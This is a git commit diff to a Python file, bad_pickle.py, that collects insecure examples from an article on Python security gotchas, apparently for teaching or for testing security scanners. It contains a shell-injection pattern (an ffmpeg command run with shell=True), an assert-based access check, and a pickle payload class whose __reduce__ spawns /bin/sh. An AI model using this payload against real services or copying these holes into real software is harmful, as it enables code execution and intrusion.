3bb93d7ced3819060db44e5366e59e3e7763f8c9
Vojtech Zhor <xzhor@ad.fi.muni.cz>
2022-04-25 14:42:48 +0200

    added buggy code

--- bad_pickle.py
+++ bad_pickle.py
@@ -1,27 +1,26 @@
 # contains bunch of buggy examples
 # taken from https://hackernoon.com/10-common-security-gotchas-in-python-and-how-to-avoid-them-e19fbe265e03
-import cPickle
+#import cPickle
 import subprocess
 import base64
-import subprocess
 
 
 # Input injection
-def transcode_file(request, filename):
+def transcode_file(filename):
     command = 'ffmpeg -i "{source}" output_file.mpg'.format(source=filename)
     subprocess.call(command, shell=True)  # a bad idea!
 
 
 # Assert statements
-def foo(request, user):
+def not_foo(user):
    assert user.is_admin, 'user does not have access'
    # secure code...
 
 
 # Pickles
 class RunBinSh(object):
-  def __reduce__(self):
-    return (subprocess.Popen, (('/bin/sh',),))
+    def __reduce__(self):
+      return (subprocess.Popen, (('/bin/sh',),))
 
 
 print(base64.b64encode(cPickle.dumps(RunBinSh())))
